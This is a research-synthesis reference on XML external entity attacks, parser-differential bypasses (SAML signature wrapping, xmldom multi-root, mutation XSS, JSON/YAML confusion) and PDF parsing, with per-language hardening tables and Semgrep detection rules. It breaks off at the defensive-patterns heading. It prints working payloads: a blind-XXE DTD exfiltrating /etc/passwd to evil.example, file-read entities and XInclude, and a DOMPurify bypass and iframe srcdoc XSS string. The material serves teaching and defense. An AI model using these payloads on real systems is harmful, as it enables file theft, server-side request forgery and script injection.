# XML Parsing, XXE, and Parser-Differential Attacks — Primitives and Defenses
## Synthesized from Timothy Morgan, Juraj Somorovsky, Mario Heiderich, Gareth Heyes, Michał Bentkowski, Frans Rosén, Daniel Stenberg, the Snyk research team, the OWASP XML working group, and Kurt Boberg

> **Researchers:**
> - **Timothy D. Morgan (Virtual Security Research / VSR)** — "XML Schema, DTD, and Entity Attacks: A Compendium of Known Techniques" (2014) and "What You Didn't Know About XML External Entities Attacks" (OWASP AppSec USA 2013). The canonical taxonomy of XXE primitives — internal/external/parameter entities, file-disclosure handler enumeration, blind-XXE-via-parameter-entities. The OWASP XXE Prevention Cheat Sheet leans directly on this corpus.
> - **Juraj Somorovsky** — Ruhr-University Bochum / Hackmanit GmbH. First author of "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012, with Mainka, Schwenk, Jensen et al.). Demonstrated 11-of-14 commercial SAML stacks vulnerable to XML Signature Wrapping. Built WS-Attacker. Co-author of "How to Break XML Encryption" (CCS 2011). XSW is the textbook parser-differential exploit: signer and consumer see different elements; the trust gap is the bypass.
> - **Mario Heiderich** — Cure53 (Berlin) founder. First author of "mXSS Attacks: Attacking Well-Secured Web-Applications by Using innerHTML Mutations" (ACM CCS 2013, with Kotowicz, Schwenk, Heinrich, Schramm, Aichroth). Defined the mutation-XSS subclass: browsers mutate strings written to innerHTML so post-parse, post-serialize output differs from input; round-trip differential bypasses every server-side allowlist sanitizer. Cure53 maintains DOMPurify (current canonical HTML sanitizer).
> - **Gareth Heyes (@garethheyes), PortSwigger Research** — File-upload XXE corpus in PortSwigger's Web Security Academy (notably "Exploiting XXE via image file upload" — SVG carrying DTD into image-processing pipelines). "The Fragile Lock: Novel Bypasses for SAML Authentication" (2024), a contemporary XSW catalogue. Author of "JavaScript for Hackers" (2022).
> - **Michał Bentkowski (@SecurityMB), Securitum** — "Write-up of DOMPurify 2.0.0 bypass using mutation XSS" (research.securitum.com, 2020), canonical reference on mXSS defeat of HTML allowlists via parsing-context shifts (math/svg foreign content modes). Extensive published writeups on parser-class confusion across JSON/XML/HTML.
> - **Frans Rosén (@fransrosen), Detectify Labs** — Detectify Security Advisor; blog corpus of XML/SOAP attack chains, including SSRF via WSDL ingestion, exposed-WSDL enumeration, and SAML/OAuth chain disclosures. HackerOne all-time top earner; the Detectify Labs back-catalogue is the working field-record of SOAP/WSDL XXE/SSRF in production.
> - **Daniel Stenberg** — curl/libcurl maintainer; "The URL Interop Situation" and the "Don't mix URL parsers" series. Stenberg's framing of WHATWG vs. RFC 3986 differentials — "every implementer handles WHATWG, RFC 3986, and everything in between" — is the canonical model for parser-spec gaps that the XML world inherits.
> - **Snyk research team** — Liran Tal, Sam Sanoop, and the broader Snyk practice; ecosystem-wide disclosures across xmldom, libxmljs, libxmljs2, fast-xml-parser, xml2js, csv-parse, and the Java XML stack. security.snyk.io is the practical "which parser version is vulnerable to which class" reference.
> - **OWASP XML / XXE Working Group** — Maintainers of the XML External Entity Prevention Cheat Sheet and XML Security Cheat Sheet. Canonicalize the per-parser secure-by-default flags (Java JAXP `disallow-doctype-decl`, .NET `DtdProcessing.Prohibit`, lxml `resolve_entities=False`).
> - **Kurt Boberg (GHSA reporter `kurt-r2c`)** — Staff Security Researcher at Semgrep. Three publicly-credited CVEs in this cluster:
>   - **CVE-2022-39353** — @xmldom/xmldom allows multiple root nodes in a DOM (GHSA-crh6-fp67-6883, CVSS 9.8 Critical). Parser accepts non-well-formed XML with multiple top-level elements without raising; downstream signature verifiers, SAML processors, and OOXML readers that assumed single-root validity now process attacker-injected elements. The canonical multi-root parser-differential CVE in the npm ecosystem; fixed in 0.7.7 / 0.8.4 / 0.9.0-beta.4.
>   - **CVE-2022-29546** — HtmlUnit NekoHtml OutOfMemory via crafted processing-instruction (GHSA-6jmm-mp6w-4rrg). Quadratic-blowup resource-exhaustion in PI parsing; HTML-parser sibling of billion-laughs. Fixed in 2.61.0.
>   - **CVE-2019-0228** — Apache PDFBox XXE via crafted XFDF in Stamp annotation (PDFBOX-4505). FDF/XFDF parser constructed without disabling DOCTYPE; XFDF with external entities exfiltrates files or initiates outbound SSRF. Disclosed on oss-security 2019-04-12. Fixed in 2.0.15.
>
> Sources: portswigger.net/research; cure53.de/fp170.pdf; usenix.org/conference/usenixsecurity12; research.securitum.com; labs.detectify.com; daniel.haxx.se; security.snyk.io; cheatsheetseries.owasp.org; nvd.nist.gov; github.com/advisories; issues.apache.org/jira/browse/PDFBOX-4505; openwall.com/lists/oss-security/2019/04/12/1.

---

## 1. The XML primitive — entity model and why it's hostile

### XML is a program, not a document

The XML 1.0 spec (W3C REC-xml) defines four extension points that turn what looks like a data format into a small, side-effectful evaluation environment:

1. **DTD** — Grammar embedded inline (`<!DOCTYPE root [...]>`) or external (`<!DOCTYPE root SYSTEM "http://attacker/dtd">`). Declares element shape, attribute defaults, *and* entity substitutions.
2. **Internal entities** — Inline string-substitution macros: `<!ENTITY foo "bar">` lets `&foo;` expand to `bar` during parse.
3. **External entities** — Macros whose value is fetched at parse: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`. The parser dereferences via a `URIResolver`-class interface handling `file://`, `http://`, `ftp://`, `jar://`, `netdoc://`, and others.
4. **Parameter entities** — Used *inside the DTD itself*, declared with `%`. Enable conditional sections, recursive expansion, and the multi-stage external-DTD-load pattern that powers blind XXE.

The DTD-as-program model is design intent, inheriting SGML's publishing-pipeline lineage. Every conformant parser ships this evaluation machinery enabled by default. XXE is a *vulnerability class* rather than a single library bug: the bug is the spec, and every conformant parser is born XXE-capable. Defensive engineering means turning off conformant features. Cross-link to `deserialization_expertise.md` — same structural fact: application input contains executable behavior, executed during ingestion.

### The four canonical XXE primitives

The 2014 Morgan compendium partitions the attack surface into four primitives:

1. **Billion Laughs** — Nested internal-entity expansion. `<!ENTITY lol "lol">` then `<!ENTITY lol2 "&lol;&lol;...">` cascaded through `&lol9;` yields ~3 GB of string from ~1 KB of input. Pure DoS.
2. **Quadratic Blowup** — Single long entity referenced N times. Avoids the nested-entity limits some parsers added against billion-laughs; still produces multi-GB memory blowup.
3. **External-Entity File Read** — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` then `<root>&xxe;</root>`. If the parser dereferences `file://`, file contents inline into the document. When the application echoes parsed XML, contents exfiltrate directly.
4. **External-Entity SSRF / OOB exfiltration** — `<!ENTITY xxe SYSTEM "http://internal/admin">` pivots through the parser's outbound HTTP client. When the application does not echo, exfiltration goes OOB: attacker hosts a DTD that uses parameter entities to construct an exfil URL, target parser fetches it, contents arrive on the attacker's web log.

### Language-by-language parser inventory

The XXE attack surface is *every* XML parser invocation in *every* runtime. Per-runtime sink set and default safety:

| Runtime | Parser libraries | Default vulnerable? | Hardening |
|---|---|---|---|
| Java | JAXP (SAX/DOM/StAX), dom4j, JDOM, XOM, JAXB, Jackson-dataformat-xml | Yes (default JAXP allows DOCTYPE) | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| Python | lxml, xml.etree, xml.sax, xml.dom, xmltodict | lxml: yes; stdlib: partial pre-3.7.1 | `lxml.etree.XMLParser(resolve_entities=False, no_network=True)`; stdlib: `defusedxml` |
| Ruby | Nokogiri, REXML, Ox | Nokogiri: NO by default; REXML: historically yes | `Nokogiri::XML(input) { \|c\| c.strict.nonet }` |
| .NET | XmlDocument, XmlReader, XPathDocument, XDocument | XmlDocument: yes (.NET ≤ 4.5.1) | `XmlReaderSettings { DtdProcessing = Prohibit, XmlResolver = null }` |
| Node.js | @xmldom/xmldom, libxmljs, libxmljs2, fast-xml-parser, xml2js | xmldom: no DTD eval (different bug surface — §3); libxmljs: yes | libxmljs: `{ noent: false, dtdload: false, dtdvalid: false, nonet: true }` |
| PHP | DOMDocument, SimpleXML, XMLReader | Yes pre-8.0; default-off post-8.0 | `libxml_disable_entity_loader(true)` (deprecated 8.0+) |
| Go | encoding/xml | No external entity resolution; quadratic-blowup possible | XXE-immune by design |
| Rust | quick-xml, xml-rs, serde-xml-rs | No external entity resolution | Same as Go |
| Perl | XML::LibXML, XML::SAX | XML::LibXML: yes via libxml2 | `XML::LibXML->new(no_network=>1, load_ext_dtd=>0, expand_entities=>0)` |
| Erlang/Elixir | xmerl (OTP), Saxy | xmerl: yes; Saxy: no | `xmerl_scan` with `fetch_fun` returning no_fetch |

The structurally immune parsers (Go, Rust quick-xml, Saxy) do not implement external entity resolution. Every spec-compliant parser ships the foot-gun.

Cross-link: this table is the sink catalogue for static-analysis rules; see §8 and the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview).

### "Validating parser" is not safe by default

Schema validation (XSD, RNG) runs *after* entity expansion. The classic Morgan demonstration: a `<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` payload with `<validated_field>&xxe;</validated_field>` expands during parse; the validator sees a conformant `xs:string` whose contents are the file contents. Validation passes; exfiltration succeeds. Defense must be at *parse time* (disable DTD/entity), not at validate time.

---

## 2. XXE — the canonical bug class with 20+ years of corpus

### Out-of-band exfiltration via parameter entities

The blind-XXE pattern (Morgan 2014, codified in PortSwigger's Web Security Academy) chains parameter entities to defeat the no-echo constraint. Attacker hosts an external DTD:

```xml
<!-- attacker-controlled https://evil.example/dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://evil.example/?d=%file;'>">
%wrapper;
%exfil;
```

Payload sent to target:

```xml
<!DOCTYPE r [ <!ENTITY % remote SYSTEM "https://evil.example/dtd"> %remote; ]>
<r/>
```

Sequence: target loads `%remote;` → `%file;` resolves `/etc/passwd` → `%wrapper;` defines `%exfil;` as a SYSTEM URL containing the file contents → `%exfil;` triggers an HTTP fetch → attacker reads contents from web log.

Nested parameter-entity definitions are forbidden in the *internal* DTD subset (XML 1.0 well-formedness), which is why the nested entity is defined inside an *external* DTD. The double-indirection bypasses the well-formedness check.

Parser support: Java JAXP (Xerces) — vulnerable when DOCTYPE allowed; lxml/libxml2 — vulnerable when `no_network=False`; PHP libxml — pre-8.0 default; .NET XmlReader — requires `DtdProcessing != Prohibit`.

### Blind XXE via error messages

When OOB egress is blocked, error-message reflection is the channel. A payload that defines `%file;` then constructs a SYSTEM URL like `file:///nonexistent/%file;` raises a parser error of the form `"failed to load file:///nonexistent/root:x:0:0:..."` — the error embeds `%file;` contents. If the application echoes parser errors, file contents leak through the error string.

### XInclude as XXE-by-another-name

XInclude (`xmlns:xi="http://www.w3.org/2001/XInclude"`) is a W3C inclusion mechanism orthogonal to DTD: `<xi:include parse="text" href="file:///etc/passwd"/>`. Some stacks ship XInclude enabled — Xerces with `XIncludeAware=true`, certain dom4j configs, several SAML libraries that explicitly enable it for metadata. Critical: **disabling DOCTYPE does not disable XInclude**. Defense requires both DOCTYPE deny AND `XIncludeAware=false`.

### File handler enumeration

URI schemes a parser resolves are the per-implementation attack surface. Key handlers: `file://` (local read, all platforms), `http(s)://` (SSRF), `ftp://` (FTP probe), `jar://` (JAR-archive traversal, Java/Xerces only), `netdoc://` (directory enumeration, Java only), `expect://` (PHP RCE if expect.so loaded), `data://` (PHP inline payload), `phar://` (PHP — bridges to deserialization gadget chains; cross-link `deserialization_expertise.md`), `jrt://` (Java 9+ runtime module read), `gopher://` (legacy raw-TCP SSRF, mostly removed). The `phar://` scheme is the highest-leverage modern variant — an XXE that loads `phar://uploaded.phar/x` invokes PHP unserialization on Phar metadata.

### Recent high-impact XXE corpus

The 2018-2026 corpus demonstrates the class is not dead — every new file-upload feature, SOAP integration, and SAML stack is a fresh parser-construction site.

- **CVE-2019-0228 (Apache PDFBox)** — Kurt Boberg. PDFBox 2.0.14 constructs an FDF parser without `disallow-doctype-decl`; XFDF as Stamp annotation triggers XXE. Severity 9.8. Triage lesson: PDFBox is XML-shaped at multiple layers (XFDF, AcroForms, XMP); each is independent parser construction. Fixed in 2.0.15.
- **CVE-2024-29849 (Veeam Backup Enterprise Manager)** — XXE in mgmt console SAML/auth-bridge; credential theft + lateral movement on backup infra.
- **CVE-2022-44877 (CWP / CentOS Web Panel)** — XXE in preauth XML parser; combined with adjacent command injection for preauth RCE.
- **CVE-2021-44832 (Apache Log4j)** — XML-config-file XXE in `XmlConfiguration`.
- **Confluence corpus** (CVE-2021-26086, CVE-2020-36239) — XML parsing in SOAP/REST endpoints continues to harbor XXE classes.

### File upload as the modern XXE vector

The classic SOAP entry point is no longer dominant. Modern surface is *file upload*:

- **SVG upload** (avatar, image embed) → image-processing pipeline invokes an XML parser. Even when MIME-type is validated, the embedded DTD/entity payload executes during parse.
- **OOXML upload** (.docx, .xlsx, .pptx) → office-conversion pipeline (LibreOffice, Apache POI, docx4j, OpenXML SDK) unpacks the ZIP and parses each XML part. Any of ~25 parses per document is an attack surface.
- **EPUB upload** → ZIP unpacked, META-INF/container.xml + OPF + NCX + per-chapter XHTML each parsed.
- **XFDF / FDF upload** (PDF forms, e-signature) → PDF library parses the XML side-data. Kurt's CVE-2019-0228 lives here.
- **SAML POST** → SAML response is XML, parsed *before* signature verification in most legacy stacks. Preauth primitive.
- **WSDL/SOAP ingestion** (Frans Rosén corpus) → exposed WSDL endpoints pass full XML payloads to dom4j / JAX-WS / Axis.

Engineering lesson: hardening the parser library is insufficient if application code re-constructs parsers in 12 upload handlers with 12 default-unsafe factory invocations. Centralize parser construction in one hardened factory.

---

## 3. The parser-differential class

### The shape of the bug

Two parsers operate on the same bytes. Parser A — *validator*, *signature-verifier*, *security-checker* — sees one document. Parser B — *consumer*, *processor*, *renderer* — sees a different document. Adversarial bytes in the gap between A's and B's grammars bypass A's policy and reach B's behavior.

Not XML-specific — same structural class as HTTP request smuggling (Kettle), URL parser confusion (Stenberg / Orange Tsai), JSON duplicate-key handling, protobuf encoding ambiguities. XML's corpus is larger and older because its grammar is richer (DTD, namespaces, XInclude, foreign content modes), so the per-parser cone of accepted-but-non-conformant bytes is correspondingly larger.

Stenberg's framing: "every implementer handles the spec, the legacy spec, and everything in between." The "everything in between" is where differentials live.

### Kurt's CVE-2022-39353: @xmldom/xmldom multi-root parser-differential

XML 1.0 is unambiguous: well-formed XML has *exactly one* root element (production rule 1: `document ::= prolog element Misc*`). Multi-root documents must be rejected.

xmldom ≤ 0.7.6 / ≤ 0.8.3 / ≤ 0.9.0-beta.3 accepted multi-root documents without raising; the parsed DOM contained all top-level elements as `childNodes` of the `Document`.

The bug is *consumer trust* amplification. Every downstream tool that consumes an xmldom DOM assumed the parser raised on non-well-formed input. Consider XML signature verification on `<Envelope><Body>...</Body><Signature>...</Signature></Envelope>`:

1. Verifier walks DOM, locates `<Signature>`, canonicalizes, hashes, compares — reports valid.
2. Application processes `Envelope` payload.

Now feed multi-root: `<Envelope>...legit_signed...</Envelope><Envelope>...attacker_payload...</Envelope>`. Verifier may walk only the first `Envelope` (signed); consumer may iterate `childNodes` and process the second. Same DOM, different walk; the gap is the bug.

Same shape as SAML XSW (§4) but at the parser layer rather than the XPath/canonicalization layer. The CVE made this trivially reachable in every npm app that parses signed XML — SAML libraries, SOAP clients, signed-OOXML readers, signed-RSS aggregators.

Fix in 0.7.7 / 0.8.4: raise on multi-root in strict mode; warn in non-strict. Workaround: "search for elements only in `documentElement`, or reject documents with more than 1 childNode."

### Parser-differential exploit framing in three steps

1. **Identify two parsers in the trust chain.** Common: signer+verifier, validator+consumer, sanitizer+renderer, scanner+processor, WAF+backend.
2. **Find the cone of accepted-but-non-conformant inputs for the permissive parser.** Multi-root, unmatched tags, mixed-mode foreign content, comment-injection through non-spec entity expansion, BOM confusion at boundaries, namespace-default rewriting.
3. **Construct input that the strict parser rejects on, or that strict accepts and assigns one meaning while permissive assigns another.** The asymmetry is the bug.

### Defensive rule

*One parser, one canonical form, no round-tripping between parsers.* Never use Parser A to validate and Parser B to process. Never serialize-then-re-parse for a security-relevant decision.

### Signature canonicalization differentials

XML Canonicalization (C14N) is itself a parser. RFC 3076 / 6090 specify how to convert a node-set into a unique byte sequence so signature hashes are stable across implementations. C14N has its own parser-differential CVE history:

- **Comment inclusion/exclusion** — `c14n` (comments excluded) vs `c14n-with-comments`. Signer/verifier mismatch has caused bypass CVEs in libxml2 and Apache Santuario.
- **Namespace context inheritance** — Inherited `xmlns:foo` serializes differently across impls; canonicalization bytes differ; signatures don't verify cross-implementation on identical DOMs.
- **Exclusive vs inclusive C14N (xml-exc-c14n)** — Mismatched modes between SignedInfo declaration and verifier default produced SAML/WS-Security bypasses 2010-2015.

The Somorovsky XSW corpus rests on this: adding bytes that don't canonicalize differently (signature validates) but do parse differently (consumer sees different content) breaks integrity without invalidating the signature.

---

## 4. SAML and OOXML — the high-leverage substrates

### SAML XML Signature Wrapping (Somorovsky 2012)

XSW is the textbook parser-differential attack. The shape:

1. IdP signs SAML Assertion declaring `Subject=alice`. Signature includes `<Reference URI="#assertion_id">`.
2. Attacker modifies response: adds a second Assertion `Subject=admin` with different ID. Original signed Assertion is preserved but moved to a less-prominent position (inside `Extensions` or as hidden child of SignedInfo).
3. SP signature verifier walks DOM, finds `Reference URI="#assertion_id"`, locates original signed Assertion, validates — *pass*.
4. SP auth logic *separately* walks DOM looking for "the Assertion," finds the attacker's unsigned one (the XPath differs from the verifier's), authenticates as `admin`.

Somorovsky's 2012 USENIX paper enumerated 8 distinct XSW shapes (XSW-1 through XSW-8), now the standard taxonomy in SAML test suites. The class persists in 2024+ (Heyes "Fragile Lock") because the structural cause — two distinct DOM walks in the trust chain — has not been eliminated. Mature libraries (OpenSAML, SimpleSAMLphp, ITfoxtec) pin the signed element to a specific XPath, enforce exactly-one-Assertion, reject `Extensions` outside SignedInfo. Every new SAML stack re-derives the bug surface.

Heyes 2024 "Fragile Lock" XSW variants in contemporary SAML: comment-injection inside signed elements; DOCTYPE-injected entities; namespace prefix re-declaration; xs:anyType slot abuse. Each is a parser-differential at a different XML-stack layer (element / attribute / comment / namespace tree).

### xmldom multi-root applied to SAML

Kurt's CVE-2022-39353 lands here directly. Many Node.js SAML stacks (passport-saml, samlify, node-saml) used xmldom. Multi-root makes XSW reachable through a new path:

```xml
<saml:Response>...signed legit (subject=alice)...</saml:Response>
<saml:Response>...attacker (subject=admin)...</saml:Response>
```

If the verifier walks `documentElement` only and auth walks `childNodes`, the attacker's Response wins. xmldom 0.7.7+ rejects this; SAML stacks pinned to older versions or that didn't validate DOM-shape post-parse inherited the bug.

Triage: signed-XML-validates-OK ≠ parsed-DOM-is-shaped-correctly. Both must hold.

### OOXML — nested ZIP of nested XML

`.docx`, `.xlsx`, `.pptx`, `.odt`, `.epub` are ZIPs containing multiple XML parts. OOXML (ECMA-376) defines ~25 content types parsed separately. Opening a `.docx` invokes ~10 XML parsers: `[Content_Types].xml`, `_rels/.rels`, `word/document.xml`, `word/styles.xml`, `word/settings.xml`, `word/numbering.xml`, `word/footnotes.xml`, `word/_rels/document.xml.rels`, `docProps/core.xml`, `docProps/app.xml`. Each is an independent attack surface.

OOXML XXE corpus: Apache POI (XMLBeans backing parser); docx4j; OpenXML SDK (.NET); python-docx; openpyxl; LibreOffice subprocess pipelines (`customXml/itemProps1.xml` slot has surfaced multiple times).

Triage rule: an OOXML upload feature is *25 attack surfaces*, not one.

### Comment-injection within signed XML

A 2018 Cure53 audit (DUO, OneLogin, Clever) demonstrated comment-injection inside signed SAML username/email elements. Email like `attacker@evil.com<!---->@target.com` canonicalizes such that signature validates (comments inside signed element), but consumer text extraction (`element.textContent`) returns *different text* depending on whether the consumer DOM treats `<!---->` as a node split or as inline character data. Attacker signs as `evil.com`, consumer reads as `evil.com` while server logic accepts `target.com` user. Fix: pre-strip comments before signing AND before extraction; reject assertions whose pre/post-canonicalization forms differ.

---

## 5. HTML parser differentials and mutation-XSS

### HTML5 tree construction is intentionally permissive

The HTML5 spec describes a state-machine tree-construction algorithm designed to accept *any* bytes and produce *some* DOM — no "rejected" output. Complexity: 23 insertion modes, ~200 states, foreign-content modes for SVG/MathML, per-element token overrides.

Server-side sanitizers (DOMPurify, kses, sanitize-html, HTML Purifier) *approximate* the HTML5 parser. Approximation is the bug surface — every sanitizer is more-permissive or more-restrictive than the spec.

### Foreign-content mode escapes (SVG / MathML)

The single largest mXSS surface is the HTML → SVG/MathML → HTML mode transition. In HTML mode, `<![CDATA[ ]]>` is treated as a comment-like delimiter; inside `<svg>` or `<math>`, CDATA is a special construct and `<style>` is closed differently. Same bytes tokenize two ways.

Bentkowski 2020 DOMPurify 2.0.0 bypass:

```html
<svg><p><style><a id="</style><img src=x onerror=alert(1)>">
```

DOMPurify's parser saw `<style>...</style>` closed inside `<a id="...">` (HTML-attribute context); the browser applied SVG foreign-content rules, terminated `<style>` early, and started a new HTML token stream containing the `<img>`. Different DOMs; sanitized output executed.

DOMPurify 3.x added foreign-content awareness; subsequent bypasses moved to other mode boundaries. Arms race is structural.

### `noscript`, `template`, `iframe srcdoc` edge cases

- **`<noscript>`** — Contents are raw text when JS enabled, normal HTML when disabled. Sanitizers must assume worst case.
- **`<template>`** — Contents parsed into a separate DocumentFragment. Mismatch when sanitizer strips a payload from main DOM but leaves it inside `<template>` that later gets cloned.
- **`<iframe srcdoc>`** — Value is itself an HTML document parsed by a fresh tokenizer. Sanitizers often don't recursively sanitize the attribute value. Classic bypass: `<iframe srcdoc="<script>alert(1)</script>">`.

### Recent CVE corpus

- **CVE-2024-45801 / -47875 (DOMPurify)** — mXSS via prototype pollution + foreign content; cross-link `prototype_pollution_expertise.md`.
- **sanitize-html historical** — Multiple 2018-2023 bypasses; each closes one primitive, structural class remains.
- **CVE-2022-29546 (HtmlUnit NekoHtml)** — Kurt Boberg. DoS sibling: PI handling triggers unbounded memory growth. Same parser, different bug shape. Fixed in 2.61.0.

### Round-trip parsing as the structural anti-pattern

Common to every HTML-sanitizer CVE: sanitizer parsed once, serialized, stored; consumer parsed again. Two parses, two parsers, the differential is the bug. Defense: sanitize at the parsed-DOM layer, not the string layer. Modern recommendation: Trusted Types or browser-native Sanitizer API — sanitize in the same parser that will render.

---

## 6. JSON / YAML / TOML parser-differentials

XML is the historical anchor of parser-differential attacks, but the same structural class appears in every modern serialization format. JSON, YAML, and TOML are not safe because they "look simpler" than XML; their grammars have just as many implementation-defined corners.

### JSON duplicate-key handling

ECMA-404 says nothing definite about duplicate keys. `{"a": 1, "a": 2}` is well-formed JSON; implementations choose. Last-wins (V8, Python, Go, Jackson default, .NET, Ruby, PHP), first-wins (Erlang `jsone`), or list-preserved (OCaml `yojson`).

The differential is the bug: Microsoft 2018 "Industry-Wide Vulnerability in JSON Parsers" — a JSON authz policy parsed first-wins then re-parsed last-wins. Attacker sends `{"role": "user", "role": "admin"}`; validator sees `user`, consumer sees `admin`. Bishop Fox writeup broadened the corpus to four cross-runtime triples. Recommendation: sign canonicalized JSON only (RFC 8785).

### YAML 1.1 vs 1.2 boolean parsing

YAML 1.1 (PyYAML, snakeyaml, js-yaml ≤ 3.x default) interprets unquoted `y`, `Y`, `yes`, `no`, `on`, `off`, etc. as booleans. YAML 1.2 restricts to `true`/`false`.

The Norway Problem: list of country codes containing `NO` parses as `[<bool: false>]` under 1.1, `["NO"]` under 1.2. A YAML authz policy with `allow_admin: yes` parses differently across versions; mixing 1.1 and 1.2 parsers in one trust chain creates a config-bypass primitive.

### YAML alias / anchor recursion

`a: &a [*a, *a]` — alias-loop, parser dereferences `*a` while constructing `a`. PyYAML raises recursion error; legacy parsers loop to OOM. Billion-laughs sibling.

YAML tags (`!!python/object`, `!!java...`) are direct deserialization triggers — `yaml.load` without `SafeLoader` is straight RCE. Cross-link to `deserialization_expertise.md`.

### JSON Schema `$ref` recursion and external resolution

JSON Schema / OpenAPI / AsyncAPI use `$ref` (JSON Pointer, RFC 6901). Parsers following `$ref` chains can loop on cycles; worse, `$ref` can point to external URLs (`{"$ref": "https://evil.example/schema.json"}`) — direct analogue of XML external entities. JSON Schema processors resolving external `$ref` by default are XXE-equivalent for the JSON era. Swagger-codegen / OpenAPI-tools have had RCE CVEs combining remote `$ref` resolution with code-generation gadget chains.

### Cross-link to deserialization

JSON/YAML inherit XML's structural lessons (see `deserialization_expertise.md`):

- Type-info in user input (`@type`, `__class__`, `!!python/object`) is always a polymorphic-deserialization gadget surface.
- Recursive structures (alias loops, `$ref` cycles, entity nesting) are always a DoS surface.
- Same-format-different-parser is always a confusion surface.

---

## 7. PDF parsing

### PDFs are XML-shaped at multiple layers

A PDF is a binary object graph with multiple embedded XML payloads: XMP metadata (RDF/XML in `<x:xmpmeta>`), XFDF (form data + annotation interchange — Kurt's CVE-2019-0228 lives here), AcroForm dictionaries, XFA forms (Adobe's XML form-template language, deprecated 2017+), and embedded XML attachments. Each is a separate parser construction site in any PDF library (Adobe Reader, Foxit, PDFBox, iText, pdf-lib, pdfjs-dist, PyMuPDF, mupdf, Ghostscript). Hardening one does not harden the rest.

### CVE-2019-0228 in detail

PDFBox 2.0.14's `PDAnnotationStamp` includes FDF/XFDF import. The parser was constructed via `SAXParserFactory.newInstance().newSAXParser()` — no `setFeature("disallow-doctype-decl")`. A Stamp annotation referencing XFDF with `<!DOCTYPE xfdf [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` triggers external-entity dereferencing during parse. Exfiltration channel = wherever parsed XFDF surfaces (annotation tooltip, exported metadata, error reflection). In Solr/Tika pipelines exposing metadata via REST, exfil is direct.

PDFBOX-4505 fix added `disallow-doctype-decl=true`. Fixed in 2.0.15. Structural lesson: PDFBox has many XML construction sites; subsequent CVE-2021-31811, CVE-2021-31812 were further XXE/DoS variants in adjacent paths.

### PDF JavaScript and PDF.js

PDFs can embed JavaScript (Adobe Acrobat extension); historically a major Reader CVE surface (2007-2014). PDF.js (Firefox's pure-JS reader) implements a subset of Acrobat's dialect; engine mismatches are parser-differentials. CVE-2024-4367 (April 2024) escaped PDF.js's sandbox via a font-handling path performing `Function(...)` on attacker bytes — parser-differential RCE in the browser viewer.

### Type-confusion in PDF object dictionaries

PDF's object graph uses untyped dictionaries. Same key can hold string, name, array, stream, or indirect reference depending on parser interpretation. The "Shadow Attacks on PDF Signatures" corpus (Ruhr-University Bochum, same group as Somorovsky) produced PDF-signature-bypass CVEs 2019-2021 via object-stream layer differentials — signed PDFs whose post-signature appearance differs from pre-signature.

---

## 8. Detection — static analysis lens

### Sink catalog: XML parser construction calls

Static analysis for XXE is *parser-construction-site* detection. Sinks are constructor calls; the bug is the *absence* of hardening primitives. Different shape from "find dangerous call" — it's "find dangerous default *configuration*."

| Language | Sinks | Required hardening |
|---|---|---|
| Java | `SAXParserFactory.newInstance()`, `DocumentBuilderFactory.newInstance()`, `XMLInputFactory.newInstance()`, `TransformerFactory.newInstance()`, `SchemaFactory.newInstance()` | `disallow-doctype-decl=true` + disable `external-general-entities` + `external-parameter-entities` + `setXIncludeAware(false)` |
| Java (dom4j) | `new SAXReader()` | Same JAXP features as above |
| Java (Jackson XML) | `new XmlMapper()` | `getFactory().getXMLInputFactory().setProperty(SUPPORT_DTD, false)` |
| Python (lxml) | `etree.parse`, `etree.fromstring`, `etree.XMLParser` | `XMLParser(resolve_entities=False, no_network=True)` |
| Python (stdlib) | `xml.etree`, `xml.sax`, `xml.dom.minidom` | `defusedxml`; or 3.7.1+ stdlib defaults |
| Ruby (Nokogiri) | `Nokogiri::XML` | `{ \|c\| c.strict.nonet }` (modern default-safe) |
| .NET | `new XmlDocument()`, `XmlReader.Create` | `XmlReaderSettings { DtdProcessing = Prohibit, XmlResolver = null }` |
| Node.js (libxmljs) | `libxmljs.parseXml` | `{ noent:false, dtdload:false, dtdvalid:false, nonet:true }` |
| PHP | `new DOMDocument`, `simplexml_load_*` | `LIBXML_NONET`; `libxml_disable_entity_loader(true)` pre-8.0 |
| Go | `xml.NewDecoder`, `xml.Unmarshal` | Default-safe |

### Source enrichment: identify request-to-parser without explicit feature-off

The Semgrep rule shape: identify code paths where a parser is constructed *and* a request-derived source flows into the parser *without* the hardening primitives in between. This is a two-step taint analysis combined with a *negative* property check (the absence of hardening).

```yaml
rules:
  - id: java-xxe-vulnerable-saxparser
    languages: [java]
    severity: ERROR
    message: |
      SAXParserFactory constructed without disabling DOCTYPE.
      Add factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true).
    patterns:
      - pattern: |
          $FACTORY = SAXParserFactory.newInstance();
          ...
          $FACTORY.newSAXParser().parse($INPUT, ...);
      - pattern-not: |
          $FACTORY.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

This is a "negation of a hardening configuration" rule — the dangerous pattern is the *default-unsafe constructor* used *without* the explicit hardening call. Cross-link to the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) for the rule-authoring discipline; the canonical Semgrep semgrep-rules repo has these rules under `java/lang/security/audit/xxe/` and `python/lang/security/`.

### Higher-order rules

**Round-trip parser-mismatch**: detect two distinct parsers in one trust chain. Pattern: `$PARSER_A.parse($INPUT)` → `$TRANSFORMER.transform(...)` → `$PARSER_B.parse(...)`. High FP rate (legitimate validation does this), so severity WARNING with metadata steering toward "is this signed-XML processing?"

**XInclude-enabled detection** is a separate sink class — the standard XXE defense doesn't cover it. Direct rule: `$FACTORY.setXIncludeAware(true)`.

**Unhardened OOXML parsers**: `new XSSFWorkbook($PATH)` without `POIXMLProperties.SaxHelper.disableEntityResolver = true`. Apache POI default-unsafe pre-patch.

**Two-parsers-in-one-process hygiene rule**: flag projects that import multiple XML parser libraries (e.g., both `xmldom` and `libxmljs`; both `dom4j` and `JAXP`). Configuration smell worth auditing; not a vuln by itself.

---

## 9. Defensive patterns

### Default-deny DTD processing

